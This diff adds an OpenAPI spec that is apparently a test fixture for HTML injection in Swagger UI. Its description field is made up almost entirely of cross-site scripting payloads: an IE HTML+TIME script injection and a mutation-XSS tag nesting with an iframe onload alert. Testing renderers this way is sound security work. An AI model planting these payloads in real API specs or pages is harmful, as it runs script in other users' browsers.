@@ -1,0 +1,11 @@
+openapi: "3.0.0"
+
+info:
+  title: Agora Swagger HTML injection
+  description:
+    <HTML><BODY>
+<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+<?import namespace="t" implementation="#default#time2">
+<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
+</BODY></HTML>
+    xss<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
